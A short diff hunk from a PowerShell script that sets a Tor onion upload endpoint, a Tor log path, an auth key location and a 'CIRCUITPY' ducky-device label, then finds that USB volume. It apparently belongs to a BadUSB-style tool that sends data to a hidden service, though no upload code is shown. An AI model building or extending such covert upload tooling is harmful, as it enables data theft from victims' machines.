@@ -8,7 +8,7 @@ $onionURL = "rokyn4z5yzjmbwb5pr5mdes2rmogz2vzfmrvt4mx6ur5mum5bqytkcad.onion"
 $uploadURL = $onionURL + "/upload.php"
 $logFile = "$dropPath\tools\tor\tor.log"
 $duckyLabel = "CIRCUITPY"
-$privKeyDest = $dropPath + "\auth\auth.private"
+$privKeyDest = $dropPath + "\tools\tor\auth\auth.private"
 
 $drive = Get-Volume | Where-Object { $_.FileSystemLabel -eq $duckyLabel }
 
